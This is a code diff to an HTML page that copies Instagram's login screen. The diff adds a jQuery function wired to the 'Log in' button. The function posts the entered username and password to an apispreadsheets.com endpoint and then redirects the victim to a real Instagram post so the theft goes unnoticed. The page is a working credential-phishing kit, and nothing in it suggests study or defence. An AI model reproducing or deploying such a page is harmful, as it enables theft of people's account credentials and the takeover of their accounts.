@@ -1,6 +1,23 @@
 <head>
   <link rel="Icon" type="image/x-icon" href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
   <title>Instagram</title>
+
+  <script
+  src="https://code.jquery.com/jquery-3.4.1.js"
+  integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+  crossorigin="anonymous"></script>
+  <script>
+  function SubForm (){
+      $.ajax({
+          url:'https://api.apispreadsheets.com/data/p6CNxfzcZQ1Fx7yX/',
+          type:'post',
+          data:$("#form").serializeArray(),
+          success: function(){
+            window.location.replace("https://www.instagram.com/p/By7NkskoTip");
+          },
+      });
+  }
+</script>
 </head>
 <body>
   <span id="root">
@@ -16,7 +33,7 @@
                   <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                 </div><!-- Header end -->
                 <div class="form-wrap">
-                  <form class="form">
+                  <form id="form" class="form">
 
                     <div class="input-box">
                       <input type="text" id="username" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
@@ -27,7 +44,7 @@
                     </div>  
 
                     <span class="button-box">
-                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
+                      <button class="btn" type="button" name="submit" onclick="SubForm()">Log in</button>
                     </span>  
 
                     <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
@@ -79,11 +96,5 @@
     function la(src) {
       window.location=src;
     }
-  </script>
-
-  <script>
-  function sendMessage() {
-  <a href="mailto:vyperhub@gmail.com">
-  }
   </script>
 </body>
